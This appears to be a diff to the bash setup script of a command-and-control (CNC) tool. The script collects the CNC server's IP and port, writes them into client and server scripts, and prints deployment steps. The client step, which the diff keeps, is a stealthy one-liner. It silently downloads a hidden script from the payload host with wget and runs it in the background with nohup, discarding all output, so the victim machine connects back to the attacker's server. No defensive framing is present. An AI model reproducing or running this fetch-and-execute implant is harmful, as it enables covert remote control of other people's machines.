@@ -36,7 +36,7 @@ CNC_SERVER_SAVED=0
 
 while [[ ${CNC_SERVER_SAVED} -ne 1 ]] 
 do
-    read -p "Enter CNC server IP and Port : " CNC_SERVER
+    read -p "Enter CNC Server's Public IP and Port to listen on (this machine): " CNC_SERVER
     [[ ${CNC_SERVER} =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}\:[0-9]{1,4}$ ]] && CNC_SERVER_SAVED=1 && continue
     print_colored "red" "Status: Invalid Input\n" "no"
     printf "  Format: <IP>:<PORT>\n"
@@ -92,8 +92,13 @@ sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payl
 
 echo "All client/server scripts have been updated with the peoper host/port information provided"
 print_colored "cyan" "\nEnter these commands to continue:\\n"
-printf "\t[ON CNC SERVER] \n\tpython3 final_server.pl\n\n"
-printf "\t[ON CLIENT] \n\t{ wget -q -O .i.sh ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }\n\n"
+# printf "\t[ON CNC SERVER] \n\t"
+print_colored "cyan" "\t[ON CNC SERVER] This listening for inconming connections from the client.  \n" "no"
+printf "\tpython3 server_phell.pl\n\n"
+
+print_colored "cyan" "\t[ON CLIENT] This command starts a connection to CNC server.\n" "no"
+
+printf "\t{ wget -q -O .i.sh ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .i.sh &> /dev/null & }\n\n"
 
 
 
